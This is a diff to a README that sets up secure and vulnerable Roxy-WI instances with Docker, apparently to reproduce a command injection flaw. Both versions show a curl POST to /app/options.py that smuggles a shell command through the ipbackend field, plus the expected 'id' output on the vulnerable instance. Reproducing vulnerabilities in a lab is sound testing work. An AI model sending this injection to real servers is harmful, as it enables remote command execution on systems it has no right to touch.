@@ -1,13 +1,11 @@
 # secure instance
 ```bash
-docker run -d --name roxy-wi -p 443:443 -p 8765:8765 registry.roxy-wi.org/roxy-wi
+docker compose -f docker-compose-safe.yml up -d 
 ```
-go to https://localhost
+Execute `curl -X POST "https://localhost/app/options.py" --data "alert_consumer=1&ipbackend=\";id+#" --insecure` command and you will receive a http redirect response like `<title>Redirecting...</title>`
 
 # vulnerable instance
-Based on an ubuntu 24.04 virtual machine: 
 ```bash
-bash vulnerableInstance.sh
-# execute the exploit for `id` command
-curl -X POST "https://localhost/app/options.py" --data "alert_consumer=1&serv=127.0.0.1&ipbackend=\";id+##&backend_server=127.0.0.1" -H "X-Requested-With: XMLHttpRequest" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" --insecure
+docker compose -f docker-compose.yml up -d 
 ```
+Execute `curl -X POST "https://localhost/app/options.py" --data "alert_consumer=1&ipbackend=\";id+#" --insecure` command and you will receive a similar response like `uid=48(apache) gid=48(apache) groups=48(apache)<br>`
